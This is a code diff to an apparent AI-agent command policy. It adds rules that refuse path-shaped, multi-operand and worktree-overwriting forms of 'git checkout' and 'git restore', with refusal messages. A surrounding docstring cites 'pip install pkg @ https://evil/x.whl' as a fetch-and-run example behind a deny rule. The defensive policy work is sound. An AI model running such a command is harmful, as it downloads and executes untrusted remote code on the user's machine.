@@ -239,6 +239,35 @@ class Subcommand:
             in the token, not just at the front: PEP 508 lets the name come
             first, so ``pip install pkg @ https://evil/x.whl`` is the same
             fetch-and-run as ``pip install https://evil/x.whl``.
+        denied_operand_substrings: ``{lowercase substring: reason}`` refused
+            in any non-flag token AND in any resolved flag value, wherever the
+            substring sits. For characters that cannot appear in a revision but
+            can appear anywhere in a pathspec: a glob marker (``*``, ``?``,
+            ``[``) mid-token still names files to overwrite
+            (``git checkout src/*.py``), where a prefix rule would miss it.
+            Prefixes stay the rule for characters that are only meaningful at
+            the front (``.``, ``/``). A dot or slash later in the token is an
+            ordinary branch or revision (``release/1.2``).
+        max_operands: The most non-flag positional tokens this subcommand
+            takes. The one past it is refused, whatever it names: on
+            ``git checkout`` the first operand is the branch, so a second one
+            is a path to overwrite (``git checkout main src/foo.py`` restores
+            that file), and flag values a value-taking flag consumed never
+            count. ``no_operands`` is the zero of this; setting both says the
+            same thing twice, so :meth:`__post_init__` refuses it.
+        operands_require_flags: Operands are refused unless at least one of
+            these flags is present anywhere in the invocation, before or after
+            the operand. For a subcommand whose operands are always paths but
+            whose flags decide whether the working tree is touched:
+            ``git restore`` restores files unless ``--staged`` (or ``-S``)
+            carries it, so its operands are refused without one.
+        operands_refuse_flags: Operands are refused when any of these flags is
+            present anywhere in the invocation, even when a require-flag is
+            also present. The refuse side wins, because the combination still
+            overwrites (``git restore --staged --worktree``). Read through the
+            same spelling the CLI reads: a unique long-option abbreviation
+            (``--work`` for ``--worktree``) and every letter of a short cluster
+            (``-SW`` is ``-S`` and ``-W``) count.
         delegate_flag: For :attr:`BinaryPolicy.positional` rules only — the
             flag whose value names ANOTHER policed binary, so the rest of the
             invocation is re-classified against that binary's policy
@@ -280,6 +309,10 @@ class Subcommand:
     confirm: bool = False
     confirm_reason: str = ""
     denied_operand_prefixes: Mapping[str, str] = field(default_factory=dict)
+    denied_operand_substrings: Mapping[str, str] = field(default_factory=dict)
+    max_operands: int | None = None
+    operands_require_flags: frozenset[str] = frozenset()
+    operands_refuse_flags: frozenset[str] = frozenset()
     delegate_flag: str = ""
     script_args: bool = False
     exact_options: frozenset[str] = frozenset()
@@ -345,6 +378,24 @@ class Subcommand:
                     "operand that distinguishes the confirmable call from the "
                     "refused one."
                 )
+        if self.no_operands and self.max_operands is not None:
+            raise ValueError(
+                "A Subcommand may set 'no_operands' or 'max_operands', never "
+                "both: no_operands already caps the count at zero."
+            )
+        if self.max_operands is not None and self.max_operands < 0:
+            raise ValueError(
+                "A Subcommand's 'max_operands' cannot be negative; "
+                f"{self.max_operands} names no count of operands."
+            )
+        overlap = self.operands_require_flags & self.operands_refuse_flags
+        if overlap:
+            raise ValueError(
+                "A Subcommand's operand gate flags must be disjoint; "
+                f"{sorted(overlap)} is in both operands_require_flags and "
+                "operands_refuse_flags, so one flag would both allow and "
+                "refuse the same operands."
+            )
 
 
 @dataclass(frozen=True)
@@ -869,6 +920,32 @@ _GIT_LOG_VALUE_SHORT = _GIT_DIFF_VALUE_SHORT | {"-n", "-L"}
 #: there as ``--filters``.
 _GIT_TEXT = frozenset({"--text"})
 
+#: `git checkout` takes one operand, the branch to switch to. Anything shaped
+#: like a path is a restore, not a switch: git overwrites the file from the
+#: index or the named branch, and the uncommitted change is gone. A branch
+#: name cannot start with `.` or `/`, cannot contain `:` (and `:/` is
+#: pathspec magic, `:/text` a revision search), and cannot contain the glob
+#: markers `*`, `?`, or `[` anywhere, so those shapes are paths by
+#: elimination. The one form this cannot tell from a branch is a bare
+#: relative path (`git checkout src/foo.py`), which stays approval-gated and
+#: is covered by the coding skill guidance instead.
+_GIT_CHECKOUT_PATH_REASON = (
+    "it names a path to restore, not a branch to switch to: checkout "
+    "overwrites that file from the index, discarding uncommitted changes. "
+    "Switch branches by naming the branch alone, or let the user restore "
+    "the file"
+)
+_GIT_CHECKOUT_PATH_PREFIXES = {
+    ".": _GIT_CHECKOUT_PATH_REASON,
+    "/": _GIT_CHECKOUT_PATH_REASON,
+    ":": _GIT_CHECKOUT_PATH_REASON,
+}
+_GIT_CHECKOUT_PATH_SUBSTRINGS = {
+    "*": _GIT_CHECKOUT_PATH_REASON,
+    "?": _GIT_CHECKOUT_PATH_REASON,
+    "[": _GIT_CHECKOUT_PATH_REASON,
+}
+
 
 def _git_read(
     *,
@@ -913,6 +990,11 @@ def _git_write(
     denied_flags: frozenset[str] = frozenset(),
     denied_flag_reasons: Mapping[str, str] | None = None,
     value_flags: frozenset[str] = frozenset(),
+    denied_operand_prefixes: Mapping[str, str] | None = None,
+    denied_operand_substrings: Mapping[str, str] | None = None,
+    max_operands: int | None = None,
+    operands_require_flags: frozenset[str] = frozenset(),
+    operands_refuse_flags: frozenset[str] = frozenset(),
 ) -> Subcommand:
     """One confirmable git write. *reason* is the line the user approves, so it
     says what this subcommand does — ``git add`` and ``git checkout`` are both
@@ -927,6 +1009,11 @@ def _git_write(
             **_GIT_READ_DENIED_FLAG_REASONS,
             **(denied_flag_reasons or {}),
         },
+        denied_operand_prefixes=denied_operand_prefixes or {},
+        denied_operand_substrings=denied_operand_substrings or {},
+        max_operands=max_operands,
+        operands_require_flags=operands_require_flags,
+        operands_refuse_flags=operands_refuse_flags,
     )
 
 
@@ -1885,12 +1972,35 @@ BINARY_POLICIES: dict[str, BinaryPolicy] = {
                     "hooks, which are the checks the project asked for",
                 },
             ),
+            # `checkout` switches branches with one operand. A second operand,
+            # a `--` separator, or a path-shaped operand turns it into a
+            # restore that overwrites files. Those forms are refused, and the
+            # ones that name their files come back as confirm-once: the user
+            # is asked once, with a risk note, and an unattended run refuses
+            # them. The patch and side-selecting forms (`-p`, `--ours`,
+            # `--theirs`, `--pathspec-from-file`) are refused the same way:
+            # `-p` discards hunks interactively, and the others overwrite
+            # files the prompt cannot show or bound. `switch --merge` is the
+            # way to carry uncommitted edits across branches.
             "checkout": _git_write(
                 "switches branches or overwrites files in the working tree — "
                 "any uncommitted change to a file it touches is lost, and "
                 "nothing recovers it",
                 value_flags=frozenset({"-b"}),
-                denied_flags=frozenset({"-f", "--force", "-B", "--orphan"}),
+                denied_flags=frozenset(
+                    {
+                        "-f",
+                        "--force",
+                        "-B",
+                        "--orphan",
+                        "--",
+                        "--pathspec-from-file",
+                        "-p",
+                        "--patch",
+                        "--ours",
+                        "--theirs",
+                    }
+                ),
                 denied_flag_reasons={
                     "-f": "it discards uncommitted changes without reporting "
                     "which ones. Commit or stash first, then switch",
@@ -1900,7 +2010,28 @@ BINARY_POLICIES: dict[str, BinaryPolicy] = {
                     "else, which loses the commits it pointed at",
                     "--orphan": "it starts a branch with no history, which is "
                     "a repository-shaped change no per-command prompt conveys",
+                    "--": "everything after it is a path to restore, not a "
+                    "branch to switch to. Switch branches without naming paths",
+                    "--pathspec-from-file": "it reads the paths to overwrite "
+                    "from a file, so the approval prompt cannot show which "
+                    "files it touches. Name the paths on the command line "
+                    "instead",
+                    "-p": "it discards hunks interactively, so the prompt "
+                    "cannot show which changes it throws away. Name the "
+                    "files to restore instead",
+                    "--patch": "it discards hunks interactively, so the "
+                    "prompt cannot show which changes it throws away. Name "
+                    "the files to restore instead",
+                    "--ours": "it overwrites the file with one side of a "
+                    "merge, discarding the other side. Resolve the conflict "
+                    "by editing the file, or let the user run the command",
+                    "--theirs": "it overwrites the file with one side of a "
+                    "merge, discarding the other side. Resolve the conflict "
+                    "by editing the file, or let the user run the command",
                 },
+                max_operands=1,
+                denied_operand_prefixes=_GIT_CHECKOUT_PATH_PREFIXES,
+                denied_operand_substrings=_GIT_CHECKOUT_PATH_SUBSTRINGS,
             ),
             "switch": _git_write(
                 "switches branches in this repository",
@@ -1921,9 +2052,44 @@ BINARY_POLICIES: dict[str, BinaryPolicy] = {
                     "a repository-shaped change no per-command prompt conveys",
                 },
             ),
+            # `restore` with a path overwrites the working tree; only the
+            # index-only form survives, so the rule's operands need `--staged`
+            # and refuse every flag that restores the working tree instead
+            # (`--worktree`, `--ours`, `--theirs`, `--merge`, `--conflict`).
+            # `--pathspec-from-file` names the paths from a file the prompt
+            # cannot show, and `-p` discards hunks interactively, so both
+            # are refused too. The named-file forms come back as confirm-once
+            # rather than refused outright: the user is asked once, with a
+            # risk note, and an unattended run refuses them.
             "restore": _git_write(
-                "overwrites files from the index or a commit — uncommitted "
-                "changes to those files are lost, and nothing recovers them"
+                "unstages files in this repository: the index only, never "
+                "the working tree. Restoring a named file asks once, with a "
+                "risk note; the whole-tree forms are refused outright",
+                value_flags=frozenset({"-s", "--source"}),
+                denied_flags=frozenset({"--pathspec-from-file", "-p", "--patch"}),
+                denied_flag_reasons={
+                    "--pathspec-from-file": "it reads the paths to overwrite "
+                    "from a file, so the approval prompt cannot show which "
+                    "files it touches. Name the paths on the command line "
+                    "instead",
+                    "-p": "it discards hunks interactively, so the prompt "
+                    "cannot show which changes it throws away. Name the "
+                    "files to restore instead",
+                    "--patch": "it discards hunks interactively, so the "
+                    "prompt cannot show which changes it throws away. Name "
+                    "the files to restore instead",
+                },
+                operands_require_flags=frozenset({"--staged", "-S"}),
+                operands_refuse_flags=frozenset(
+                    {
+                        "--worktree",
+                        "-W",
+                        "--ours",
+                        "--theirs",
+                        "--merge",
+                        "--conflict",
+                    }
+                ),
             ),
             # `list`/`show` read; `drop`/`clear` destroy a stash entry, which
             # is the one copy of work that is in no commit, so they get no
@@ -2857,7 +3023,9 @@ def _denied_operand(rule: Subcommand, binary: str, token: str | None) -> str | N
     ``pip``, ``install https://x`` and ``install -r https://x`` fetch and run
     the same remote code.
     """
-    if not token or not rule.denied_operand_prefixes:
+    if not token or (
+        not rule.denied_operand_prefixes and not rule.denied_operand_substrings
+    ):
         return None
     lowered = token.lower()
     for prefix, reason in rule.denied_operand_prefixes.items():
@@ -2867,7 +3035,49 @@ def _denied_operand(rule: Subcommand, binary: str, token: str | None) -> str | N
         anywhere = ":" in prefix or "+" in prefix
         if lowered.startswith(prefix) or (anywhere and prefix in lowered):
             return f"'{binary} … {token}' is not allowed: {reason}."
+    for substring, reason in rule.denied_operand_substrings.items():
+        if substring in lowered:
+            return f"'{binary} … {token}' is not allowed: {reason}."
     return None
+
+
+def _spelled_gate_flags(
+    policy: BinaryPolicy, rule: Subcommand, token: str, name: str
+) -> frozenset[str]:
+    """The operand-gate flags *token* spells, or empty.
+
+    A gate flag decides whether an operand may appear at all
+    (:attr:`Subcommand.operands_require_flags` /
+    :attr:`Subcommand.operands_refuse_flags`), so it has to be read the way
+    the CLI reads it: a unique long-option abbreviation (``--work`` for
+    ``--worktree``) and every letter of a short cluster (``-SW`` is ``-S``
+    and ``-W``) count, and a letter that takes a value ends the cluster:
+    the rest of the token is its value, not another flag. Without this, the
+    gate would read ``git restore -SW file`` as staged-only and allow it,
+    while git restores the working tree too.
+    """
+    gate = rule.operands_require_flags | rule.operands_refuse_flags
+    if not gate:
+        return frozenset()
+    if policy.single_dash_long:
+        return frozenset({name}) if name in gate else frozenset()
+    if token.startswith("--"):
+        if name in gate:
+            return frozenset({name})
+        if not policy.abbreviated_options:
+            return frozenset()
+        return frozenset(flag for flag in gate if _long_flag_matches(name, flag))
+    value_taking = _value_taking_flags(rule)
+    spelled: set[str] = set()
+    for letter in token[1:]:
+        if letter == "=":
+            break
+        flag = f"-{letter}"
+        if flag in gate:
+            spelled.add(flag)
+        if flag in value_taking:
+            break
+    return frozenset(spelled)
 
 
 def classify_invocation(
@@ -2968,6 +3178,9 @@ def classify_invocation(
         )
 
     action: str | None = None
+    operands: list[str] = []
+    seen_flags: set[str] = set()
+    has_gate = bool(rule.operands_require_flags or rule.operands_refuse_flags)
     cursor = 0
     while cursor < len(rest):
         token = rest[cursor]
@@ -2989,11 +3202,23 @@ def classify_invocation(
                     f"'{policy.binary} {subcommand}' reads; naming something "
                     "after it makes it a write this grant does not offer."
                 )
+            operands.append(token)
+            if rule.max_operands is not None and len(operands) > rule.max_operands:
+                return _refuse(
+                    f"'{policy.binary} {subcommand} {token}' is not allowed: "
+                    f"'{policy.binary} {subcommand}' takes at most "
+                    f"{rule.max_operands} operand"
+                    f"{'s' if rule.max_operands != 1 else ''}, and an extra "
+                    "one changes what the call does rather than what it acts "
+                    "on. Name only the operand this grant covers."
+                )
             if action is None:
                 action = token
             continue
 
         name, inline = _split_flag(token, single_dash_long=policy.single_dash_long)
+        if has_gate:
+            seen_flags |= _spelled_gate_flags(policy, rule, token, name)
         # Checked before the action is classified, so a denied flag refuses the
         # call outright — a confirmable write carrying one never reaches a
         # prompt, because the flag is the escalation, not the write.
@@ -3108,6 +3333,32 @@ def classify_invocation(
                     f"{', '.join(sorted(v.upper() for v in allowed))}. "
                     "Other methods can modify the remote."
                 )
+
+    # The operand gate is judged after the loop, not as each operand is read:
+    # a flag that decides whether an operand may appear can follow it
+    # (`git restore file --staged`), so the whole invocation has to be read
+    # before any operand is judged. A refusal here is still a refusal, never
+    # a prompt: the forms it catches discard uncommitted work, and an
+    # unattended run would approve a prompt for them without seeing it.
+    if operands and (rule.operands_require_flags or rule.operands_refuse_flags):
+        spelled = f"{policy.binary} {subcommand} {' '.join(operands)}"
+        clashing = sorted(rule.operands_refuse_flags & seen_flags)
+        if clashing:
+            return _refuse(
+                f"'{spelled}' is not allowed: {' '.join(clashing)} makes "
+                "this overwrite the working tree, so uncommitted changes to "
+                "those files are lost. Run it without that flag, or let the "
+                "user run the command."
+            )
+        if rule.operands_require_flags and not (
+            rule.operands_require_flags & seen_flags
+        ):
+            return _refuse(
+                f"'{spelled}' is not allowed: operands need "
+                f"{' or '.join(sorted(rule.operands_require_flags))}. "
+                "Without it this overwrites files in the working tree, and "
+                "uncommitted changes to them are lost."
+            )
 
     if (
         rule.relative_endpoint
